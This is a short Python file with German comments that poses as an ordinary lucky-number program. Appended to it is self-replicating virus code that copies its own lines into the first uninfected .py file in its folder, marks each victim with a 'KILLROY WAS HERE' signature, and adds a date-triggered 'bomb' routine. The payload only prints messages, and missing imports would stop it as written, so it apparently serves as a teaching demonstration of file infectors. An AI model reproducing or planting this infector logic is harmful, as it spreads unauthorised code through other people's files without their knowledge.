# Eine x-beliebige Programmdatei
import random

for _ in range(1,10):
    print("Deine Glückszahl ist %d" % (random.randint(1,10)))

SIGNATUR = "==== KILLROY WAS HERE ===="

zeileStart=6
zeileEnde=60

# Gibt den Pfad einer Datei aus dem Verzeichnis zurück, die noch nicht "infiziert" ist
def FindePyDatei(Pfad):
    # Wichtig: Die Virusdatei und die eigene Datei dürfen nicht "infiziert werden"
    for pyDatei in [d for d in os.listdir(Pfad) if d.endswith(".py") and d != __file__ and d != "PythonVirus.py"]:
        pyPfad = os.path.join(Pfad, pyDatei)
        # Nach Signatur suchen
        with open(pyPfad, encoding="utf-8") as fh:
            infiziert = False
            for zeile in fh:
                if SIGNATUR in zeile:
                    infiziert = True
                    break
        if not infiziert:
            return pyPfad
    return ""

def bomb():
    if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 22:
        print("!!! Killroy says: HAPPY EARTHDAY !!!")

# Fuegt an das Ende der Datei den "Viruscode" ein
def InjizierePayload():
    pfad = os.path.dirname(__file__)
    pyPfad = FindePyDatei(pfad)
    if pyPfad == "":
        # Es gibt nichts zu tun
        return
    # PyDatei infizieren
    virusCode = ""
    # Einlesen des Viruscodes aus der eigenen Datei
    with open(__file__, encoding="utf8") as fh:
        for i, zeile in enumerate(fh):
            if i >= zeileStart and i <= zeileEnde:
                virusCode += zeile

    # Den Viruscode an die "Opferdatei" anhängen  
    # Zuvor müssen aber noch die Variablen zeileStart und zeileEnde angepasst werden
    zeilenAnzahl = len(open(pyPfad).readlines()) + 1
    virusCode = virusCode.replace("zeileStart=6", "zeileStart=" + str(zeilenAnzahl))
    virusCode = virusCode.replace("zeileEnde=60", "zeileEnde=" + str(zeilenAnzahl+54))
    with open(pyPfad, mode="a", encoding="utf8") as fh:
        fh.writelines(virusCode)
    print("*** Datei %s wurde infiziert ***" % pyPfad)
# Soll die erste Py-Datei im aktuellen Verzeichnis infizieren
InjizierePayload()
bomb()